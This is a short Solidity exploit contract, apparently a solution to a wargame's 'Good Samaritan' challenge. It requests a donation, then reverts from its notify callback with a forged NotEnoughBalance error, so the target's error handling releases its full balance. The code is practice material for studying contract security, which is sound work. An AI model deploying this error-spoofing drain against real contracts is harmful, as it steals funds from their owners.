// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {GoodSamaritan} from "./GoodSamaritan.sol";

error NotEnoughBalance();

contract AttackGoodSamaritan {
    GoodSamaritan goodSamaritan;
    uint private cnt = 1;

    constructor(address _goodSamaritan) {
        goodSamaritan = GoodSamaritan(_goodSamaritan);
    }

    function attack() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
